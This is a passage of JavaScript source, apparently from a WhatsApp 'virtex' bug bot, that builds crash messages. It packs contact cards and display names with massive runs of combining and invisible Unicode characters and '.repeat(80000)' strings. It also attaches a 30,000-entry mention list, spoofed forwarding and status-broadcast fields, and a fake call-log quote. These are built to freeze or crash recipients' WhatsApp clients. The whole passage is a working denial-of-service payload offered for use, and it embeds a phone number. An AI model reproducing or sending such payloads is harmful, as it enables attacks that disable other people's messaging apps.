ۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + "ꦾ".repeat(10000),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭⪼\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ꦾ.repeat(80000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      },
      {
        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + "ါ".repeat(19000),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭⪼𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ါ.repeat(79000)\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      }
    ],
    contextInfo: {
      mentionedJid: ['0@s.whatsapp.net'],
    },
  },
},
body: { text: 'ꦾ𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉꦾ' + ui + jids},
  contextInfo: {
    mentionedJid: ['0@s.whatsapp.net'],
    mentions: ['0@s.whatsapp.net'],
      },
        footer: { text: '#FAWAZLEKAN' },
          nativeFlowMessage: {},
         contextInfo: {
          mentionedJid: ["0@s.whatsapp.net", ...Array.from({
           length: 30000
          }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
          forwardingScore: 1,
          isForwarded: true,
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
         },
groupMentions: [
{
  groupJid: "1@broadcast",
  groupSubject: virtex // PASTIKAN BUTTON SUDAH DITETAPKAN
}
],
    isForwarded: true,
    quotedMessage: {
      callLogMesssage: {
        isVideo: true,
        callOutcome: "7",
        durationSecs: "0",
        callType: "REGULAR",
        participants: [{
          jid: "0@s.whatsapp.net",
          callOutcome: "7"
        }]
      },
        interactiveResponseMessage: {
            body: {
                text: "Sent",
                format: "EXTENSIONS_7"
            },
            nativeFlowResponseMessage: {
                name: "custom_message",
                paramsJson: `{
"screen_2_OptIn_0": true,
